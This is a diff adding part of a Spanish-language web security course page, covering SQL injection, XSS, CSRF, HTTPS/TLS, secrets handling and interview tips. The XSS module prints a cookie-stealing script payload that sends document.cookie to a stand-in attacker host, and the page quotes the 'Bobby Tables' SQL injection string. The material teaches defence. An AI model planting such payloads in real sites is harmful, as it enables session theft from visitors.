+        <ul class="text-sm text-gray-600 space-y-1">
+          <li>• Va a SQL → parametrizar (nunca "limpiar a mano")</li>
+          <li>• Va a HTML → escapar (&lt; se vuelve &amp;lt;) — módulo 4</li>
+          <li>• Es una ruta de archivo → resolver y verificar que quede DENTRO de la carpeta permitida</li>
+        </ul>
+      </div>
+    </div>
+    <div class="bg-purple-50 border border-purple-200 rounded-xl p-4 mb-10 text-sm text-purple-900">
+      📖 <strong>El chiste que lo inmortalizó:</strong> el cómic xkcd del niño llamado <em>Robert'); DROP TABLE Students;--</em> ("Little Bobby Tables"). La escuela perdió sus registros por concatenar el nombre en el SQL. La moraleja del cómic es literal: <em>"espero que hayan aprendido a sanitizar las entradas de la base de datos"</em>.
+    </div>
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 border-t-4 border-purple-600" id="quiz3">
+      <h3 class="text-xl font-bold text-slate-800 mb-1">Examen — Módulo 3</h3>
+      <p class="text-sm text-gray-500 mb-6">Inyección SQL y Validación.</p>
+      <div id="quiz3Questions"></div>
+      <button onclick="gradeQuiz(3)" class="mt-6 bg-purple-600 text-white font-semibold px-8 py-3 rounded-xl hover:bg-purple-700 transition">Calificar</button>
+      <div id="quiz3Result" class="mt-4 hidden"></div>
+    </div>
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(2)" class="text-sm text-gray-500 hover:text-slate-800">← OWASP</button>
+      <button onclick="showChapter(4)" class="bg-slate-800 text-white px-6 py-2 rounded-xl hover:bg-red-800 transition text-sm font-semibold">Siguiente: XSS/CSRF →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 4: XSS Y CSRF ===== -->
+<div class="chapter" id="ch4">
+  <section class="bg-gradient-to-r from-cyan-700 to-cyan-900 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-cyan-300 text-sm mb-2">Módulo 4</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">XSS y CSRF</h1>
+    <p class="text-lg text-cyan-200">Los dos ataques del lado del navegador que todo dev web debe entender.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-10 border-l-4 border-cyan-500">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">📜 XSS — Cross-Site Scripting: el grafiti ejecutable</h2>
+      <p class="text-sm text-gray-600 mb-4">El <span class="gterm">XSS<span class="gtooltip">🇺🇸 XSS — Cross-Site Scripting — Ataque donde contenido enviado por un usuario (ej. un comentario) contiene JavaScript que se ejecuta en el navegador de OTROS usuarios al ver la página. Se previene escapando la salida.</span></span> ocurre cuando lo que un usuario ESCRIBIÓ (un comentario, su "nombre") se muestra a otros usuarios <strong>sin neutralizar</strong>, y contenía un script. El navegador de la víctima lo ejecuta como si fuera parte legítima de la página — pudiendo robar su sesión o actuar en su nombre.</p>
+      <pre class="code-block code-single mb-4"><code><span class="tok-c">&lt;!-- Un usuario deja este "comentario" en tu blog: --&gt;</span>
+&lt;script&gt;fetch(<span class="tok-s">'https://atacante.com/roba?cookie='</span> + document.cookie)&lt;/script&gt;
+
+<span class="tok-c">&lt;!-- ❌ Si tu página lo muestra tal cual, CADA visitante ejecuta ese script --&gt;</span>
+
+<span class="tok-c">&lt;!-- ✅ La cura: ESCAPAR la salida. El mismo texto se guarda igual,</span>
+<span class="tok-c">     pero al mostrarse se convierte en texto inofensivo: --&gt;</span>
+&amp;lt;script&amp;gt;fetch(...)&amp;lt;/script&amp;gt;
+<span class="tok-c">&lt;!-- El visitante VE el texto del script, pero no se ejecuta --&gt;</span></code></pre>
+      <div class="grid md:grid-cols-3 gap-3 text-sm">
+        <div class="bg-cyan-50 rounded-xl p-4 border border-cyan-200"><p class="font-semibold text-cyan-800 mb-1">1. Escapa TODA salida</p><p class="text-gray-600 text-xs">Los frameworks modernos (React, Razor, Jinja2) escapan por defecto — el peligro son los "modos crudos": innerHTML, Html.Raw, |safe. Úsalos solo con contenido 100% confiable.</p></div>
+        <div class="bg-teal-50 rounded-xl p-4 border border-teal-200"><p class="font-semibold text-teal-800 mb-1">2. Content Security Policy</p><p class="text-gray-600 text-xs">Header CSP: le dice al navegador de qué orígenes aceptar scripts. Aunque se cuele algo, no se ejecuta. Defensa en profundidad ✔.</p></div>
+        <div class="bg-blue-50 rounded-xl p-4 border border-blue-200"><p class="font-semibold text-blue-800 mb-1">3. Cookies HttpOnly</p><p class="text-gray-600 text-xs">Las cookies de sesión marcadas HttpOnly no son legibles desde JavaScript: aunque haya XSS, la sesión no se roba tan fácil.</p></div>
+      </div>
+    </div>
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-10 border-l-4 border-teal-500">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">🎭 CSRF — Cross-Site Request Forgery: la firma falsificada</h2>
+      <p class="text-sm text-gray-600 mb-4">El <span class="gterm">CSRF<span class="gtooltip">🇺🇸 CSRF — Cross-Site Request Forgery — Ataque donde un sitio malicioso hace que TU navegador (con tu sesión activa) envíe una petición a otro sitio donde estás logueada, ejecutando acciones sin tu consentimiento.</span></span> abusa de que tu navegador <strong>envía tus cookies automáticamente</strong>. Estás logueada en tubanco.com; visitas un sitio malicioso que esconde un formulario auto-enviado hacia <code class="bg-gray-100 px-1 rounded text-xs">tubanco.com/transferir</code>... y tu navegador lo manda CON tu cookie de sesión. El banco cree que fuiste tú.</p>
+      <div class="grid md:grid-cols-2 gap-4">
+        <div class="bg-teal-50 rounded-xl p-4 border border-teal-200">
+          <p class="text-sm font-semibold text-teal-800 mb-1">🎫 Cura 1: Tokens anti-CSRF</p>
+          <p class="text-sm text-gray-600">Cada formulario legítimo incluye un token secreto único que el sitio malicioso NO puede conocer. Sin token válido → petición rechazada. Los frameworks lo integran: <code class="bg-teal-100 px-1 rounded text-xs">[ValidateAntiForgeryToken]</code> en ASP.NET, <code class="bg-teal-100 px-1 rounded text-xs">{% csrf_token %}</code> en Django.</p>
+        </div>
+        <div class="bg-emerald-50 rounded-xl p-4 border border-emerald-200">
+          <p class="text-sm font-semibold text-emerald-800 mb-1">🍪 Cura 2: Cookies SameSite</p>
+          <p class="text-sm text-gray-600">El atributo <code class="bg-emerald-100 px-1 rounded text-xs">SameSite=Lax/Strict</code> le dice al navegador: "no envíes esta cookie en peticiones que nazcan de OTROS sitios". Los navegadores modernos ya lo aplican por defecto — pero no dependas solo de eso (defensa en profundidad).</p>
+        </div>
+      </div>
+      <p class="text-xs text-gray-500 mt-3">🧠 Truco para no confundirlos: <strong>XSS</strong> = código malicioso ejecutándose EN tu página. <strong>CSRF</strong> = peticiones falsas hechas DESDE otra página usando la sesión de la víctima.</p>
+    </div>
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 border-t-4 border-cyan-600" id="quiz4">
+      <h3 class="text-xl font-bold text-slate-800 mb-1">Examen — Módulo 4</h3>
+      <p class="text-sm text-gray-500 mb-6">XSS y CSRF.</p>
+      <div id="quiz4Questions"></div>
+      <button onclick="gradeQuiz(4)" class="mt-6 bg-cyan-600 text-white font-semibold px-8 py-3 rounded-xl hover:bg-cyan-700 transition">Calificar</button>
+      <div id="quiz4Result" class="mt-4 hidden"></div>
+    </div>
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(3)" class="text-sm text-gray-500 hover:text-slate-800">← Inyección</button>
+      <button onclick="showChapter(5)" class="bg-slate-800 text-white px-6 py-2 rounded-xl hover:bg-red-800 transition text-sm font-semibold">Siguiente: HTTPS →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 5: HTTPS Y TLS ===== -->
+<div class="chapter" id="ch5">
+  <section class="bg-gradient-to-r from-green-700 to-green-900 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-green-300 text-sm mb-2">Módulo 5</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">HTTPS, SSL/TLS y Certificados</h1>
+    <p class="text-lg text-green-200">Qué protege realmente el candadito del navegador.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-10 border-l-4 border-green-500">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">✉️ Postal vs. sobre lacrado</h2>
+      <p class="text-sm text-gray-600 mb-4">HTTP plano es una <strong>tarjeta postal</strong>: cualquiera que la toque en el camino (el wifi del café, el proveedor de internet, un router comprometido) puede LEERLA y hasta MODIFICARLA. HTTPS = HTTP dentro de un túnel <span class="gterm">TLS<span class="gtooltip">🇺🇸 TLS — Transport Layer Security — Protocolo que cifra la comunicación entre cliente y servidor. Es el sucesor de SSL (el nombre viejo que todos siguen usando). HTTPS = HTTP sobre TLS.</span></span>: un <strong>sobre lacrado e imposible de abrir</strong> en tránsito. TLS garantiza tres cosas:</p>
+      <div class="grid md:grid-cols-3 gap-4 mb-4">
+        <div class="bg-green-50 rounded-xl p-4 border border-green-200"><p class="text-sm font-semibold text-green-800 mb-1">🔒 Confidencialidad</p><p class="text-sm text-gray-600">Nadie en el camino puede leer el contenido: ni contraseñas, ni tokens, ni datos.</p></div>
+        <div class="bg-emerald-50 rounded-xl p-4 border border-emerald-200"><p class="text-sm font-semibold text-emerald-800 mb-1">🧾 Integridad</p><p class="text-sm text-gray-600">Nadie puede modificar el mensaje en tránsito sin que se detecte.</p></div>
+        <div class="bg-teal-50 rounded-xl p-4 border border-teal-200"><p class="text-sm font-semibold text-teal-800 mb-1">🪪 Autenticidad</p><p class="text-sm text-gray-600">El certificado prueba que hablas con el VERDADERO tubanco.com y no con un impostor.</p></div>
+      </div>
+      <p class="text-xs text-gray-500">Nota de nombres: <strong>SSL</strong> es el protocolo viejo (obsoleto); <strong>TLS</strong> es el actual. Todo el mundo sigue diciendo "certificado SSL" por costumbre — en la práctica hablan de TLS.</p>
+    </div>
+
+    <h2 class="text-xl font-bold text-slate-800 mb-5 flex items-center gap-2"><span class="w-1.5 h-7 bg-green-600 rounded-full"></span>¿Cómo se establece la conexión segura?</h2>
+    <div class="bg-white rounded-xl shadow p-6 mb-6">
+      <p class="text-sm text-gray-600 mb-3">El <strong>handshake TLS</strong> simplificado (sucede en milisegundos, antes de cualquier dato):</p>
+      <ol class="space-y-2 text-sm text-gray-600">
+        <li class="flex gap-3"><span class="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 font-bold text-xs">1</span><span><strong>Hola:</strong> el navegador saluda al servidor y le dice qué métodos de cifrado soporta.</span></li>
+        <li class="flex gap-3"><span class="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 font-bold text-xs">2</span><span><strong>Identificación:</strong> el servidor presenta su <span class="gterm">certificado<span class="gtooltip">🇪🇸 Certificado digital — Documento firmado por una Autoridad Certificadora (CA) que vincula un dominio con su llave pública. El navegador verifica la firma contra las CAs en las que confía.</span></span> — firmado por una <strong>Autoridad Certificadora (CA)</strong> en la que el navegador ya confía. Como mostrar el pasaporte, no una credencial dibujada a mano.</span></li>
+        <li class="flex gap-3"><span class="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 font-bold text-xs">3</span><span><strong>Acuerdo de llaves:</strong> con criptografía de llave pública, ambos acuerdan una llave secreta compartida SIN que nadie que espíe pueda deducirla.</span></li>
+        <li class="flex gap-3"><span class="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 font-bold text-xs">4</span><span><strong>Túnel listo:</strong> todo lo que sigue viaja cifrado con esa llave. Ahora sí: HTTP normal, pero dentro del sobre lacrado.</span></li>
+      </ol>
+    </div>
+    <div class="grid md:grid-cols-2 gap-4 mb-10">
+      <div class="bg-green-50 border border-green-200 rounded-xl p-4 text-sm text-green-900">
+        🆓 <strong>Let's Encrypt:</strong> desde 2015, los certificados son GRATIS y automáticos (se renuevan solos cada 90 días con herramientas como certbot, o integrado en Cloudflare/Nginx/tu nube). Ya no existe pretexto para servir HTTP plano.
+      </div>
+      <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-4 text-sm text-emerald-900">
+        🏗️ <strong>En la práctica (conecta con CP7):</strong> el TLS se "termina" en el reverse proxy (Nginx) o el balanceador: el certificado vive ahí, y hacia adentro el tráfico va por la red privada. Header extra recomendado: <code class="bg-emerald-100 px-1 rounded">HSTS</code> — le dice al navegador "conmigo SIEMPRE HTTPS, nunca aceptes HTTP".
+      </div>
+    </div>
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 border-t-4 border-green-600" id="quiz5">
+      <h3 class="text-xl font-bold text-slate-800 mb-1">Examen — Módulo 5</h3>
+      <p class="text-sm text-gray-500 mb-6">HTTPS y TLS.</p>
+      <div id="quiz5Questions"></div>
+      <button onclick="gradeQuiz(5)" class="mt-6 bg-green-600 text-white font-semibold px-8 py-3 rounded-xl hover:bg-green-700 transition">Calificar</button>
+      <div id="quiz5Result" class="mt-4 hidden"></div>
+    </div>
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(4)" class="text-sm text-gray-500 hover:text-slate-800">← XSS/CSRF</button>
+      <button onclick="showChapter(6)" class="bg-slate-800 text-white px-6 py-2 rounded-xl hover:bg-red-800 transition text-sm font-semibold">Siguiente: Secretos →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 6: SECRETOS ===== -->
+<div class="chapter" id="ch6">
+  <section class="bg-gradient-to-r from-rose-600 to-rose-800 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-rose-300 text-sm mb-2">Módulo 6</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">Secretos y Contraseñas</h1>
+    <p class="text-lg text-rose-200">Dónde viven las llaves... y por qué jamás en el código.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-10 border-l-4 border-rose-500">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">🔑 La escalera del manejo de secretos</h2>
+      <p class="text-sm text-gray-600 mb-4">API keys, cadenas de conexión, tokens: los <strong>secretos</strong> de tu app. De peor a mejor práctica:</p>
+      <div class="space-y-3 mb-4">
+        <div class="bg-red-50 rounded-xl p-4 border border-red-200 flex gap-3"><span class="text-xl">💀</span><div><p class="text-sm font-semibold text-red-800">Nivel 0 — Hardcodeado en el código</p><p class="text-sm text-gray-600"><code class="bg-red-100 px-1 rounded text-xs">api_key = "sk_live_abc123"</code> commiteado a Git. Queda en el historial PARA SIEMPRE (borrar el archivo no lo saca del historial), y hay bots escaneando GitHub 24/7 buscando exactamente esto.</p></div></div>
+        <div class="bg-amber-50 rounded-xl p-4 border border-amber-200 flex gap-3"><span class="text-xl">🙂</span><div><p class="text-sm font-semibold text-amber-800">Nivel 1 — Variables de entorno + .env</p><p class="text-sm text-gray-600">El secreto vive en el sistema o en un archivo <code class="bg-amber-100 px-1 rounded text-xs">.env</code> que está en el <code class="bg-amber-100 px-1 rounded text-xs">.gitignore</code> (¡verifica que de verdad esté!). El código solo lee <code class="bg-amber-100 px-1 rounded text-xs">os.environ["API_KEY"]</code>. El mínimo profesional aceptable.</p></div></div>
+        <div class="bg-green-50 rounded-xl p-4 border border-green-200 flex gap-3"><span class="text-xl">🏆</span><div><p class="text-sm font-semibold text-green-800">Nivel 2 — Gestor de secretos</p><p class="text-sm text-gray-600">Azure Key Vault, AWS Secrets Manager, HashiCorp Vault: los secretos viven cifrados y centralizados, con control de acceso (IAM), <strong>auditoría</strong> de quién los leyó y <strong>rotación</strong> automática. El estándar en producción seria.</p></div></div>
+      </div>
+      <div class="code-wrap">
+        <div class="flex"><button class="ct-btn ct-active" data-lang="py" onclick="setLang('py')">🐍 Python</button><button class="ct-btn" data-lang="cs" onclick="setLang('cs')">#️⃣ C#</button></div>
+        <pre class="code-block code-py"><code><span class="tok-c"># .env (en .gitignore, NUNCA en el repo):</span>
+<span class="tok-c">#   DATABASE_URL=postgres://user:pass@host/db</span>
+<span class="tok-c">#   STRIPE_KEY=sk_live_...</span>
+
+<span class="tok-k">import</span> os
+<span class="tok-k">from</span> dotenv <span class="tok-k">import</span> load_dotenv   <span class="tok-c"># pip install python-dotenv</span>
+
+<span class="tok-f">load_dotenv</span>()                     <span class="tok-c"># carga el .env al entorno</span>
+db_url = os.environ[<span class="tok-s">"DATABASE_URL"</span>]   <span class="tok-c"># el código nunca conoce el valor</span>
+stripe_key = os.environ[<span class="tok-s">"STRIPE_KEY"</span>]</code></pre>
+        <pre class="code-block code-cs hidden"><code><span class="tok-c">// appsettings.json para lo NO sensible; secretos fuera del repo:</span>
+
+<span class="tok-c">// En desarrollo: dotnet user-secrets (fuera de la carpeta del proyecto)</span>
+<span class="tok-c">//   dotnet user-secrets set "Stripe:Key" "sk_live_..."</span>
+
+<span class="tok-k">var</span> builder = WebApplication.<span class="tok-f">CreateBuilder</span>(args);
+
+<span class="tok-c">// En producción: variables de entorno o Azure Key Vault</span>
+<span class="tok-k">string</span> stripeKey = builder.Configuration[<span class="tok-s">"Stripe:Key"</span>];
+<span class="tok-c">// La misma línea lee de user-secrets, env vars o Key Vault</span>
+<span class="tok-c">// según el ambiente — el código nunca cambia. ✅</span></code></pre>
+      </div>
+    </div>
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-10 border-l-4 border-red-500">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">🔐 Contraseñas de usuarios: hash, nunca texto</h2>
+      <p class="text-sm text-gray-600 mb-4">Regla absoluta: <strong>jamás guardes contraseñas</strong> — ni en texto plano, ni "cifradas" (lo cifrado se descifra). Se guarda su <span class="gterm">hash<span class="gtooltip">🇪🇸 Hash — Huella digital de un dato: función de un solo sentido (no se puede revertir). Para contraseñas se usan hashes LENTOS a propósito (bcrypt, Argon2) con salt, para resistir ataques de fuerza bruta.</span></span>: una huella digital de un solo sentido. Al iniciar sesión, se hashea lo que escriben y se compara con la huella guardada. Si te roban la base, no hay contraseñas que leer.</p>
+      <div class="grid md:grid-cols-3 gap-3 text-sm mb-4">
+        <div class="bg-red-50 rounded-xl p-4 border border-red-200"><p class="font-semibold text-red-800 mb-1">Usa el algoritmo correcto</p><p class="text-gray-600 text-xs"><strong>bcrypt o Argon2</strong>: lentos A PROPÓSITO (milisegundos por intento) para que probar millones de contraseñas sea inviable. MD5/SHA-1 NO sirven para contraseñas: son rápidos = fáciles de atacar.</p></div>
+        <div class="bg-rose-50 rounded-xl p-4 border border-rose-200"><p class="font-semibold text-rose-800 mb-1">Con salt único</p><p class="text-gray-600 text-xs">Un valor aleatorio por usuario mezclado antes de hashear: dos usuarios con la MISMA contraseña tienen huellas distintas, y las tablas precalculadas (rainbow tables) no sirven. bcrypt lo hace solo.</p></div>
+        <div class="bg-orange-50 rounded-xl p-4 border border-orange-200"><p class="font-semibold text-orange-800 mb-1">Y en el login</p><p class="text-gray-600 text-xs">Límite de intentos (rate limiting, ¡CP5!), mensajes genéricos ("usuario o contraseña incorrectos" — no reveles cuál falló), y ofrece autenticación de dos factores (2FA).</p></div>
+      </div>
+      <div class="bg-rose-50 border border-rose-200 rounded-xl p-4 text-sm text-rose-900">
+        🚨 <strong>Protocolo si un secreto se filtró:</strong> 1) REVÓCALO inmediatamente (no "luego"). 2) Emite uno nuevo. 3) Revisa los logs de uso durante la ventana de exposición. 4) Investiga cómo llegó ahí y agrega la barrera que faltó (pre-commit hooks como gitleaks detectan secretos antes del commit).
+      </div>
+    </div>
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 border-t-4 border-rose-500" id="quiz6">
+      <h3 class="text-xl font-bold text-slate-800 mb-1">Examen — Módulo 6</h3>
+      <p class="text-sm text-gray-500 mb-6">Secretos y Contraseñas.</p>
+      <div id="quiz6Questions"></div>
+      <button onclick="gradeQuiz(6)" class="mt-6 bg-rose-600 text-white font-semibold px-8 py-3 rounded-xl hover:bg-rose-700 transition">Calificar</button>
+      <div id="quiz6Result" class="mt-4 hidden"></div>
+    </div>
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(5)" class="text-sm text-gray-500 hover:text-slate-800">← HTTPS</button>
+      <button onclick="showChapter(7)" class="bg-slate-800 text-white px-6 py-2 rounded-xl hover:bg-red-800 transition text-sm font-semibold">Siguiente: Glosario →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 7: GLOSARIO ===== -->
+<div class="chapter" id="ch7">
+  <section class="bg-gradient-to-r from-gray-700 to-gray-900 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-gray-400 text-sm mb-2">Referencia</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">Glosario</h1>
+    <p class="text-lg text-gray-300">Términos clave en Español e Inglés. Los términos subrayados en los capítulos muestran definiciones al pasar el cursor.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+    <div class="mb-6"><input type="text" id="glossSearch" placeholder="Buscar término... / Search term..." oninput="filterGloss()" class="w-full border border-gray-300 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500 text-sm"></div>
+    <div id="glossGrid" class="grid md:grid-cols-2 gap-4 mb-10"></div>
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(6)" class="text-sm text-gray-500 hover:text-slate-800">← Secretos</button>
+      <button onclick="showChapter(8)" class="bg-indigo-600 text-white px-6 py-2 rounded-xl hover:bg-indigo-700 transition text-sm font-semibold">Vocabulario EN →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 8: VOCABULARIO EN INGLÉS ===== -->
+<div class="chapter" id="ch8">
+  <section class="bg-gradient-to-r from-indigo-700 to-violet-800 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-indigo-200 text-sm mb-2">Práctica</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">Vocabulario en Inglés</h1>
+    <p class="text-lg text-indigo-200">Haz clic en cada tarjeta para revelar la definición en inglés. Practica en voz alta.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+    <p class="text-sm text-gray-500 mb-6 text-center">💡 Haz clic en la tarjeta para voltearla. Practica decir el término en inglés antes de voltear.</p>
+    <div id="flashcardsGrid" class="grid sm:grid-cols-2 md:grid-cols-3 gap-5 mb-10"></div>
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(7)" class="text-sm text-gray-500 hover:text-slate-800">← Glosario</button>
+      <button onclick="showChapter(9)" class="bg-orange-500 text-white px-6 py-2 rounded-xl hover:bg-orange-600 transition text-sm font-semibold">Consejos Entrevistas →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 9: CONSEJOS ENTREVISTAS ===== -->
+<div class="chapter" id="ch9">
+  <section class="bg-gradient-to-r from-orange-600 to-amber-700 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-orange-200 text-sm mb-2">Carrera Profesional</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">Consejos para Entrevistas</h1>
+    <p class="text-lg text-orange-100">La seguridad distingue al senior de inmediato. Cada respuesta con traducción al español.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+
+    <div class="bg-amber-50 border border-amber-200 rounded-2xl p-6 mb-8">
+      <h2 class="font-bold text-amber-800 text-lg mb-2">🎯 Cómo hablar de seguridad en entrevistas</h2>
+      <div class="grid md:grid-cols-3 gap-4 text-sm">
+        <div><strong class="text-amber-700">Intégrala a TODA respuesta:</strong><p class="text-gray-600 mt-1">Al diseñar cualquier endpoint menciona: "validaría la entrada y verificaría que el recurso pertenece al usuario". Seguridad de pasada = mentalidad senior.</p></div>
+        <div><strong class="text-amber-700">Domina el trío clásico:</strong><p class="text-gray-600 mt-1">Inyección SQL, XSS y CSRF con su respectiva cura son el 80% de las preguntas de seguridad para devs.</p></div>
+        <div><strong class="text-amber-700">Sé honesta con los límites:</strong><p class="text-gray-600 mt-1">"Para un pentest traería especialistas; como dev mi trabajo es no dejar las puertas clásicas abiertas" es una excelente respuesta.</p></div>
+      </div>
+    </div>
+
+    <h2 class="text-xl font-bold text-slate-800 mb-5">Preguntas frecuentes de seguridad</h2>
+    <div id="interviewAccordion" class="space-y-3 mb-10"></div>
+
+    <h2 class="text-xl font-bold text-slate-800 mb-5">Frases clave en inglés para entrevistas / Key Phrases</h2>
+    <div class="grid md:grid-cols-2 gap-4 mb-10">
+      <div class="bg-white rounded-xl shadow p-5">
+        <h3 class="font-bold text-red-700 mb-3 text-sm uppercase">Hablar de prevención</h3>
+        <div class="space-y-2 text-sm">
+          <div class="bg-gray-50 rounded p-2"><p class="text-red-600 font-mono text-xs">"All queries are parameterized — never string concatenation."</p><p class="text-gray-500 text-xs">Todas las consultas van parametrizadas — nunca concatenación de texto.</p></div>
+          <div class="bg-gray-50 rounded p-2"><p class="text-red-600 font-mono text-xs">"We validate on the server; client validation is just UX."</p><p class="text-gray-500 text-xs">Validamos en el servidor; la validación del cliente es solo experiencia de usuario.</p></div>
+          <div class="bg-gray-50 rounded p-2"><p class="text-red-600 font-mono text-xs">"Output is escaped by default to prevent XSS."</p><p class="text-gray-500 text-xs">La salida se escapa por defecto para prevenir XSS.</p></div>
+          <div class="bg-gray-50 rounded p-2"><p class="text-red-600 font-mono text-xs">"Passwords are hashed with bcrypt, never stored in plain text."</p><p class="text-gray-500 text-xs">Las contraseñas se hashean con bcrypt, nunca se guardan en texto plano.</p></div>
+        </div>
+      </div>
+      <div class="bg-white rounded-xl shadow p-5">
+        <h3 class="font-bold text-indigo-700 mb-3 text-sm uppercase">Hablar de principios</h3>
+        <div class="space-y-2 text-sm">
+          <div class="bg-gray-50 rounded p-2"><p class="text-indigo-600 font-mono text-xs">"We follow the principle of least privilege."</p><p class="text-gray-500 text-xs">Seguimos el principio de menor privilegio.</p></div>
+          <div class="bg-gray-50 rounded p-2"><p class="text-indigo-600 font-mono text-xs">"Defense in depth: no single layer is enough."</p><p class="text-gray-500 text-xs">Defensa en profundidad: ninguna capa por sí sola es suficiente.</p></div>
+          <div class="bg-gray-50 rounded p-2"><p class="text-indigo-600 font-mono text-xs">"Secrets live in a vault, never in the repository."</p><p class="text-gray-500 text-xs">Los secretos viven en un gestor, nunca en el repositorio.</p></div>
+          <div class="bg-gray-50 rounded p-2"><p class="text-indigo-600 font-mono text-xs">"If a key leaks, we revoke it immediately and audit its usage."</p><p class="text-gray-500 text-xs">Si una llave se filtra, la revocamos de inmediato y auditamos su uso.</p></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(8)" class="text-sm text-gray-500 hover:text-slate-800">← Vocabulario</button>
+      <button onclick="showChapter(10)" class="bg-rose-600 text-white px-6 py-2 rounded-xl hover:bg-rose-700 transition text-sm font-semibold">Registro →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 10: REGISTRO ===== -->
+<div class="chapter" id="ch10">
+  <section class="bg-gradient-to-r from-rose-500 to-red-600 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-rose-200 text-sm mb-2">Herramienta</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">Registro de Estudios</h1></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
+      <div class="bg-white rounded-xl shadow p-5 text-center"><div class="text-3xl font-black text-red-600" id="statDays">0</div><div class="text-sm text-gray-500">Días estudiados</div></div>
+      <div class="bg-white rounded-xl shadow p-5 text-center"><div class="text-3xl font-black text-orange-500" id="statStreak">0</div><div class="text-sm text-gray-500">Racha actual</div></div>
+      <div class="bg-white rounded-xl shadow p-5 text-center"><div class="text-3xl font-black text-slate-800" id="statChapters">0/6</div><div class="text-sm text-gray-500">Exámenes aprobados</div></div>
+      <div class="bg-white rounded-xl shadow p-5 text-center"><div class="text-3xl font-black text-purple-600" id="statAvg">—</div><div class="text-sm text-gray-500">Promedio</div></div>
+    </div>
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-8">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">Registrar hoy</h2>
+      <div class="grid grid-cols-2 md:grid-cols-3 gap-3 mb-4">
+        <label class="flex items-center gap-2 bg-gray-50 rounded-lg p-3 cursor-pointer hover:bg-gray-100"><input type="checkbox" class="study-check accent-red-600" value="1"><span class="text-sm">Módulo 1: Mentalidad</span></label>
+        <label class="flex items-center gap-2 bg-gray-50 rounded-lg p-3 cursor-pointer hover:bg-gray-100"><input type="checkbox" class="study-check accent-red-600" value="2"><span class="text-sm">Módulo 2: OWASP</span></label>
+        <label class="flex items-center gap-2 bg-gray-50 rounded-lg p-3 cursor-pointer hover:bg-gray-100"><input type="checkbox" class="study-check accent-red-600" value="3"><span class="text-sm">Módulo 3: Inyección</span></label>
+        <label class="flex items-center gap-2 bg-gray-50 rounded-lg p-3 cursor-pointer hover:bg-gray-100"><input type="checkbox" class="study-check accent-red-600" value="4"><span class="text-sm">Módulo 4: XSS/CSRF</span></label>
+        <label class="flex items-center gap-2 bg-gray-50 rounded-lg p-3 cursor-pointer hover:bg-gray-100"><input type="checkbox" class="study-check accent-red-600" value="5"><span class="text-sm">Módulo 5: HTTPS</span></label>
+        <label class="flex items-center gap-2 bg-gray-50 rounded-lg p-3 cursor-pointer hover:bg-gray-100"><input type="checkbox" class="study-check accent-red-600" value="6"><span class="text-sm">Módulo 6: Secretos</span></label>
+      </div>
